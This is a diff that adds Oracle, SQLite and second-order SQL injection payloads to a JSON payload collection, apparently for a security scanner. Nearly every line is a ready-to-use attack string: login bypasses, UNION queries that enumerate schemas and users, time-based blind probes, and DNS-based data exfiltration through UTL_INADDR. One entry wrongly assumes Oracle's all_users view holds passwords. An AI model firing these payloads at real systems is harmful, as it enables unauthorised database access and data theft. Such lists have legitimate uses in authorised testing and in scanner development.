@@ -87,6 +87,36 @@
         {"payload": "username=admin&password[$ne]=wrongpassword", "description": "HTTP parameter $ne operator injection", "waf_bypass": false},
         {"payload": "username[$regex]=a.*&password[$ne]=x", "description": "HTTP parameter $regex injection", "waf_bypass": false}
       ]
+    },
+    "oracle": {
+      "description": "Oracle database-specific SQL injection payloads",
+      "payloads": [
+        {"payload": "' OR 1=1--", "description": "Classic OR bypass", "waf_bypass": false},
+        {"payload": "' UNION SELECT NULL,NULL,NULL FROM DUAL--", "description": "UNION SELECT probe using DUAL table", "waf_bypass": false},
+        {"payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", "description": "Time-based blind via DBMS_PIPE.RECEIVE_MESSAGE", "waf_bypass": false},
+        {"payload": "' || (SELECT banner FROM v$version WHERE ROWNUM=1) || '", "description": "String concat version extraction via v$version", "waf_bypass": false},
+        {"payload": "' UNION SELECT username,password,NULL FROM all_users--", "description": "UNION SELECT user enumeration from all_users", "waf_bypass": false},
+        {"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))='x", "description": "Out-of-band DNS exfiltration via UTL_INADDR", "waf_bypass": false}
+      ]
+    },
+    "sqlite": {
+      "description": "SQLite-specific SQL injection payloads",
+      "payloads": [
+        {"payload": "' OR 1=1--", "description": "Classic OR bypass", "waf_bypass": false},
+        {"payload": "' UNION SELECT sql FROM sqlite_master--", "description": "UNION SELECT schema extraction from sqlite_master", "waf_bypass": false},
+        {"payload": "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "description": "Time-based blind via heavy computation", "waf_bypass": false},
+        {"payload": "' UNION SELECT name FROM sqlite_master WHERE type='table'--", "description": "UNION SELECT table name enumeration", "waf_bypass": false},
+        {"payload": "' UNION SELECT tbl_name FROM sqlite_master--", "description": "UNION SELECT table names via tbl_name column", "waf_bypass": false}
+      ]
+    },
+    "second_order": {
+      "description": "Stored/second-order SQL injection payloads that execute when data is retrieved and used in a later query",
+      "payloads": [
+        {"payload": "admin'--", "description": "Username with comment to bypass password check on re-use", "waf_bypass": false},
+        {"payload": "' OR '1'='1", "description": "Classic OR bypass stored for later query injection", "waf_bypass": false},
+        {"payload": "test' UNION SELECT 1--", "description": "UNION SELECT stored for second-order execution", "waf_bypass": false},
+        {"payload": "admin'/*", "description": "Username with block comment for stored injection", "waf_bypass": false}
+      ]
     }
   }
 }
